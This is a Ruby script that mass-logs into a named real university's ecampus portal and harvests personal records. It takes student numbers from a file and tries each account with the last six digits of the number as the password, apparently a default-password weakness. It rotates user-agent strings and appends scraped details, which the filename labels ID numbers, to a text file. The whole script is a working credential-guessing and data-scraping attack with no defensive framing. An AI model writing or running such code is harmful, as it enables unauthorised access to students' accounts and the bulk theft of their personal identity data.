# encoding:utf-8

require 'nokogiri'
require 'mechanize'
require 'pp'

def get_id(number)
    ecampus = Mechanize.new {|agent|
        agent.open_timeout = 5
        agent.read_timeout = 5
        agent.user_agent = Mechanize::AGENT_ALIASES.values[rand(21)]
    }
    
    ecampus.get("http://ecampus.ujn.edu.cn")

    form = ecampus.page.forms[0]
    return nil if form == nil
    form.yktkh = "2" + number
    form.password = number[-6..-1]
    form.click_button

    return nil if ecampus.page.forms[0].errcode == "1"
    # 0 means done
    # 1 means error
    
    ecampus.page.forms[0].click_button
    id_page = ecampus.get("http://ecampus.ujn.edu.cn/myecard.asp")

    doc = Nokogiri::HTML(id_page.body)

    io = File.open('./2017_id_num.txt', 'a+')
    doc.search('//td[@colspan="7"]/table/tr/td[2]/div').each do |row|
        io << row.text << "\n" if row.text != ""
    end
    io.close
end

File.open("allnum.txt", "r") do |io|
    while line = io.gets
        sleep 0.5
        line = line.chomp!
        temp = get_id(line)        
    end
end

